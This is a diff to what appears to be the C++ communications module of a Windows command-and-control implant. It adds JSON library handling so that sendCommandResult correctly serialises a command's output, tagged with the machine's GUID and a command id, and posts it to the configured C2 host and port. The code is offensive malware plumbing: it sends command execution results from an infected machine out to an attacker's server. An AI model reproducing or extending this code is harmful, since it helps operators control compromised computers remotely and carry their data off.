@@ -3,6 +3,9 @@
 #include <windows.h>
 #include <winhttp.h>
 #include "comms.hpp"
+#include "../libs/nlohmann/json.hpp"
+
+using json = nlohmann::json;
 
 #define BUF_SIZE 4096
 
@@ -144,8 +147,12 @@ std::string sendCommandResult(
     // data is expected as json
     std::string data = ("{\"computer_guid\": \""+config.computer_guid+"\", "
                          "\"command_id\": \""+command_id+"\", "
-                         "\"result\": \""+command_result+"\"}");
+                         "\"result\": \""+" "+"\"}");
+    json d = json::parse(data);
+    d["result"] = command_result;
+
     std::string result;
-    result = post(config.c2_fqdn, config.c2_port, commandPath, data);
+    std::cout << data << std::endl;
+    result = post(config.c2_fqdn, config.c2_port, commandPath, d.dump());
     return result;
 }
